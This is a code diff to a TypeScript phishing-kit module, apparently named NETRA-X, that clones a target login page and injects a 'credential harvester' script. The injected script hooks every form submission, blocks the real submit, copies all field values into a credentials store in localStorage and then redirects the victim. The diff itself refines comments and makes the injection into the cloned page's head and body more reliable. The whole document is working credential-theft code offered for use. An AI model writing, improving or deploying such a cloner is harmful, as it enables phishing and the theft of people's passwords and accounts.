@@ -27,13 +27,12 @@ const getHarvesterScript = (redirectUrl: string) => `
     // This is the main function that captures form data.
     function captureAndRedirect(form) {
         try {
-            // Use FormData for robust capture of all form fields.
             const formData = new FormData(form);
             const credentials = {};
             let capturedData = false;
             
-            // Convert FormData to a plain object.
             for (let [key, value] of formData.entries()) {
+                // We only care about non-empty, string-based values.
                 if (typeof value === 'string' && value.length > 0) {
                     credentials[key] = value;
                     capturedData = true;
@@ -48,13 +47,11 @@ const getHarvesterScript = (redirectUrl: string) => `
                 };
                 const storageKey = 'netra-captured-credentials';
 
-                // Retrieve existing data, or initialize if it doesn't exist.
                 const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
                 const updatedData = [...existingData, entry];
                 localStorage.setItem(storageKey, JSON.stringify(updatedData));
             }
         } catch (e) {
-            // Log error but do not interrupt the user's redirection.
             console.error('NETRA-X Harvester: Error saving credentials to localStorage.', e);
         } finally {
             // Always redirect the user to the intended page.
@@ -65,12 +62,14 @@ const getHarvesterScript = (redirectUrl: string) => `
         }
     }
 
-    // We use the 'capture: true' option to ensure our listeners run before any
-    // other scripts on the page can interfere or stop the event.
+    // Attach a submit listener to all forms on the page using event capturing.
+    // This ensures our listener runs before any other scripts can stop the event.
     document.addEventListener('submit', function(e) {
-        // Prevent the form from actually submitting.
+        // Prevent the form from actually submitting to its original destination.
         e.preventDefault();
         e.stopPropagation();
+        
+        // Call our capture function with the submitted form.
         captureAndRedirect(e.target);
     }, true);
 </script>
@@ -98,11 +97,22 @@ export async function cloneLoginPage(input: PageClonerInput): Promise<PageCloner
     // 1. Inject <base> tag to fix relative links for CSS, images, etc.
     const url = new URL(targetUrl);
     const baseTag = `<base href="${url.origin}">`;
-    html = html.replace(/(<head[^>]*>)/, `$1${baseTag}`);
+    
+    if (html.includes('<head>')) {
+        html = html.replace(/(<head>)/, `$1${baseTag}`);
+    } else {
+        html = baseTag + html;
+    }
+
 
     // 2. Inject the credential harvester script before the closing body tag
     const script = getHarvesterScript(redirectUrl);
-    html = html.replace(/<\/body>/, `${script}</body>`);
+    if (html.includes('</body>')) {
+      html = html.replace(/<\/body>/, `${script}</body>`);
+    } else {
+      html = html + script;
+    }
+
 
     return {
       htmlContent: html,
@@ -115,4 +125,3 @@ export async function cloneLoginPage(input: PageClonerInput): Promise<PageCloner
     throw new Error('An unknown error occurred during page cloning.');
   }
 }
-
